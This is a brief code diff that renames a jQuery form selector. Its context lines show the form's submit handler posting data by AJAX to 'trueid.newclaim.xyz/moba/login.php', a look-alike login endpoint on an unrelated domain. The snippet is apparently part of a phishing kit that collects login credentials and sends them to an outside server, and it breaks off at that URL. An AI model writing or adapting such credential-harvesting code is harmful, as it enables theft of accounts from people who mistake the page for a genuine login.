@@ -1,5 +1,5 @@
-$(".col-md-12 col-12").submit(function() {
-	var d = $(".col-md-12 col-12");
+$(".formInfo").submit(function() {
+	var d = $(".formInfo");
 
 	$.ajax({
         url: "https://trueid.newclaim.xyz/moba/login.php",
